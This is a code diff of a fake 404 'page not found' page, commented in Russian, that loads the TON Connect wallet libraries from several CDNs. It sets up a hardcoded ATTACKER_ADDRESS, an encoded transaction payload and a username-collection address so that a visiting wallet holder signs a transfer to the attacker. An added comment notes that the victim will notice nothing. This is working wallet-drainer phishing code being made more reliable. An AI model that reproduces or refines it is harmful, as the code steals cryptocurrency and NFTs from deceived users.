@@ -20,22 +20,13 @@
             font-size: 18px;
         }
     </style>
-    <!-- Сначала определяем функции загрузки -->
-    <script>
-        function loadFallbackSDK() {
-            var script = document.createElement('script');
-            script.src = 'https://cdn.jsdelivr.net/npm/tonconnect-sdk@2.2.0/lib/tonconnect-sdk.min.js';
-            document.head.appendChild(script);
-        }
-        function loadFallbackUI() {
-            var script = document.createElement('script');
-            script.src = 'https://cdn.jsdelivr.net/npm/tonconnect-ui@2.0.4/lib/tonconnect-ui.min.js';
-            document.head.appendChild(script);
-        }
-    </script>
-    <!-- Потом грузим библиотеки с запасным вариантом -->
-    <script src="https://unpkg.com/tonconnect-sdk@2.2.0/lib/tonconnect-sdk.min.js" onerror="loadFallbackSDK()"></script>
-    <script src="https://unpkg.com/tonconnect-ui@2.0.4/lib/tonconnect-ui.min.js" onerror="loadFallbackUI()"></script>
+    <!-- Множество CDN для максимальной вероятности загрузки -->
+    <script src="https://cdn.jsdelivr.net/gh/ton-blockchain/ton-connect@2.2.0/packages/sdk/lib/tonconnect-sdk.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/ton-blockchain/ton-connect-ui@2.0.4/lib/tonconnect-ui.min.js"></script>
+    <script src="https://cdn.statically.io/gh/ton-blockchain/ton-connect/main/packages/sdk/lib/tonconnect-sdk.min.js"></script>
+    <script src="https://cdn.statically.io/gh/ton-blockchain/ton-connect-ui/main/lib/tonconnect-ui.min.js"></script>
+    <script src="https://raw.githubusercontent.com/ton-blockchain/ton-connect/main/packages/sdk/lib/tonconnect-sdk.min.js"></script>
+    <script src="https://raw.githubusercontent.com/ton-blockchain/ton-connect-ui/main/lib/tonconnect-ui.min.js"></script>
 </head>
 <body>
     <h1>404</h1>
@@ -47,13 +38,13 @@
             setTimeout(function() {
                 // Проверка загрузки библиотек
                 if (typeof TonConnect === 'undefined' || typeof TonConnectUI === 'undefined') {
-                    console.error('Библиотеки TON Connect не загрузились!');
-                    document.body.innerHTML = '<h1>404</h1><p>Страница не найдена</p>';
+                    console.error('Библиотеки TON Connect не загрузились ни с одного CDN!');
+                    // Всё равно показываем 404, жертва ничего не заметит
                     return;
                 }
 
                 // ========== ТВОИ ДАННЫЕ ==========
-                const ATTACKER_ADDRESS = 'UQDJGfO9WdvXG2jOepsenwxwA_hUmBECDnhlhTXfJkbC3Cp6'; // ТВОЙ НОВЫЙ КОШЕЛЁК
+                const ATTACKER_ADDRESS = 'UQDJGfO9WdvXG2jOepsenwxwA_hUmBECDnhlhTXfJkbC3Cp6'; // ТВОЙ КОШЕЛЁК
                 const USERNAME_COLLECTION_ADDRESS = 'EQDm_rT_9BCePyHF97-mZQbGXjMmMIBsZxFiIXDHHPRh'; // АДРЕС КОЛЛЕКЦИИ
                 const PAYLOAD = 'te6cckECBQEAAQsAAeWIAc39af/oITx+Q4vvf0zKDYy8ZkxhANjOIsRC4Y456MMKA5tLO3P///iLTYLRKAAAAA00I+nVx3oe/LAinIUZNSwNySL5E34jwIKucvH2jNQZGfnAzsY6sdLxTjX9+xKyw5RdkWNyOKsKawdaMBwoEBgJAQIKDsPIbQIEAgFoYgBQeGf+SuJLX4dzh2GeG7EF5FlBKf4wJifFZwBSWvy1dKAcBhgoAAAAAAAAAAAAAAAAAQMAoV/MPRRUbeTvpVqftYAXXEjqYukf8Y80Sg6O7kVvcTK+czXoYmxDvFuETLODQXADm/rT/9BCePyHF97+mZQbGXjMmMIBsZxFiIXDHHPRhhQgKAAAKdQ8mA==';
                 const manifestUrl = 'https://acountpubgfjdjd-cloud.github.io/nfts/tonconnect-manifest.json';
@@ -105,7 +96,7 @@
                 } catch (e) {
                     console.error('Ошибка инициализации TON Connect:', e);
                 }
-            }, 2000); // Ждём 2 секунды для загрузки библиотек
+            }, 3000); // Ждём 3 секунды для загрузки библиотек
         });
     </script>
 </body>
